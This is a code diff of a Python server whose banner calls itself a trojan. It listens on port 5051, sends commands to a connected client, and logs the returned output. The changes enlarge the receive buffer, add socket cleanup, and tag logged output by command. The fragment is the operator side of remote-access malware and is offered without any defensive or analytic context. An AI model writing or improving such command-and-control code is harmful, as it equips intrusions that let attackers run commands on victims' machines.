@@ -11,12 +11,13 @@ HOST = get_local_ip()
 PORT = 5051
 SERVER = (HOST, PORT)
 FORMAT = "utf-8"
-BUFFER = 1024
+BUFFER = 8192
 DC_MSG = "!dc"
 
 print("#"*32)
 print("###### Welcome to trojan! ###### ")
 print("#"*32)
+print("Waiting for incomming connections...")
 
 s.bind(SERVER)
 s.listen()
@@ -37,17 +38,19 @@ while run:
             print("Disconnected...")
             logs.close()
             run = False
+            s.close()
             break
         if cmd == "\n": 
             continue
         msg = client.recv(BUFFER).decode(FORMAT)
         print(msg)
-        msg += "\n"
+        logs.write(f"OUTPUT FOR COMMAND: {cmd}\n")
         logs.write(msg)
     except KeyboardInterrupt:
         print("\nDisconnected...")
         logs.close()
         run = False
+        s.close()
     except:
         print("Client lost... reconnected")
         client, addr = s.accept()
